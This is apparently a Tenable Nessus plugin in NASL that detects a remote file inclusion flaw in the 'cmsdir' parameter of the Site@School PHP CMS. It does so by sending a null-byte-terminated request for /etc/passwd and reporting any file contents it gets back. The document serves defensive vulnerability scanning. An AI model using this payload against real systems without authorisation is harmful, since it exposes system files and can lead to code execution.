#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is susceptible
to multiple remote file inclusion attacks. 

Description :

The remote host is running Site@School, an open-source, PHP-based,
content management system intended for primary schools. 

The version of Site@School installed on the remote host fails to
sanitize input to the 'cmsdir' parameter before using it to include
PHP code in several scripts.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
this issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://milw0rm.com/exploits/2374

Solution :

Upgrade to Site@School version 2.4.03 or later. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22368);
  script_version("$Revision: 1.1 $");

  script_name(english:"Site@School cmsdir Parameter Remote File Include Vulnerabilities");
  script_summary(english:"Tries to read a local file with Site@School");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs())
{
  if (thorough_tests) 
    files = make_list(
      "/starnet/modules/sn_allbum/slideshow.php",
      "/starnet/modules/include/include.php",
      "/starnet/themes/editable/main.inc.php"
    );
  else files = make_list("/starnet/modules/sn_allbum/slideshow.php");

  foreach file (files)
  {
    # Try to exploit the flaw to read a file.
    local_file = "/etc/passwd";
    req = http_get(
      item:string(
        dir, file, "?",
        "cmsdir=", local_file, "%00"
      ),
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      string("main(", file, "\\0/languages/EN/sn_allbum/EN.php): failed to open stream") >< res ||
      string("main(", file, "\\0/languages/EN/include/EN.php): failed to open stream") >< res ||
      string("main(", file, "\\0/themes//): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (contents && report_verbosity)
        report = string(
          desc,
          "\n\n",
         "Plugin output :\n",
          "\n",
          "Here are the contents of the file '", local_file, "' that Nessus was\n",
          "able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
